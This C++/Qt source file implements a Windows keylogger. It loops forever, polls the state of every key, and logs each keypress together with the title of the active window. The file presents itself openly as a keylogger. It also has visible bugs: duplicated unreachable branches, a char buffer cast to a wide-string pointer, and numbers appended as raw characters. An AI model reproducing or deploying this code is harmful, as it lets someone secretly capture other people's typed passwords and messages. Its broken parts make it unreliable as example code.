#ifdef WIN32
#include "key_logger.h"

#include <QTextStream>
#include <QString>

#include <windows.h>

QString codeToKey(unsigned char code);

void KeyLogger::log() {
  QTextStream klogout(stdout, QIODevice::WriteOnly);

  while(true) {
    Sleep(2); // give other programs time to run

    // get the active windowtitle
    char title[1024];
    HWND hwndHandle = GetForegroundWindow();
    GetWindowText(hwndHandle, (LPWSTR)title, 1023);

    // logging keys, thats the keylogger
    for(unsigned char c = 1; c < 255; c++) {
      SHORT rv = GetAsyncKeyState(c);
      if(rv & 1) { // on press button down
        QString key = codeToKey(c);

        klogout << title << ": " << key << endl;
      }
    }
  }
}

QString codeToKey(unsigned char code) {
  QString key;

  if(code == 1)
    key.append("[LMOUSE]"); // mouse left
  else if(code == 2)
    key.append("[RMOUSE]"); // mouse right
  else if(code == 4)
    key.append("[MMOUSE]"); // mouse middle
  else if(code == 13)
    key.append("[RETURN]");
  else if(code == 16 || code == 17 || code == 18)
    key.append("");
  else if(code == 160 || code == 161) // lastc == 16
    key.append("[SHIFT]");
  else if(code == 162 || code == 163) // lastc == 17
    key.append("[STRG]");
  else if(code == 164) // lastc == 18
    key.append("[ALT]");
  else if(code == 165)
    key.append("[ALT GR]");
  else if(code == 8)
    key.append("[BACKSPACE]");
  else if(code == 9)
    key.append("[TAB]");
  else if(code == 27)
    key.append("[ESC]");
  else if(code == 33)
    key.append("[PAGE UP]");
  else if(code == 34)
    key.append("[PAGE DOWN]");
  else if(code == 35)
    key.append("[HOME]");
  else if(code == 36)
    key.append("[POS1]");
  else if(code == 37)
    key.append("[ARROW LEFT]");
  else if(code == 38)
    key.append("[ARROW UP]");
  else if(code == 39)
    key.append("[ARROW RIGHT]");
  else if(code == 40)
    key.append("[ARROW DOWN]");
  else if(code == 45)
    key.append("[INS]");
  else if(code == 46)
    key.append("[DEL]");
  else if((code >= 65 && code <= 90) || (code >= 48 && code <= 57) || (code == 32))
    key = code;
  else if(code == 91 || code == 92)
    key.append("[WIN]");
  else if(code >= 96 && code <= 105)
    key.append("[NUM ").append(code - 96).append("]");
  else if(code == 106)
    key.append("[NUM /]");
  else if(code == 107)
    key.append("[NUM +]");
  else if(code == 109)
    key.append("[NUM -]");
  else if(code == 109)
    key.append("[NUM ,]");
  else if(code >= 112 && code <= 123)
    key.append("[F").append(code - 111).append("]");
  else if(code == 144)
    key.append("[NUM]");
  else if(code == 192)
    key.append("[OE]");
  else if(code == 222)
    key.append("[AE]");
  else if(code == 186)
    key.append("[UE]");
  else if(code == 186)
    key.append("+");
  else if(code == 188)
    key.append(",");
  else if(code == 189)
    key.append("-");
  else if(code == 190)
    key.append(".");
  else if(code == 191)
    key.append("#");
  else if(code == 226)
    key.append("<");
  else
    key.append("[KEY \\").append(code).append("]");

  return key;
}

#endif
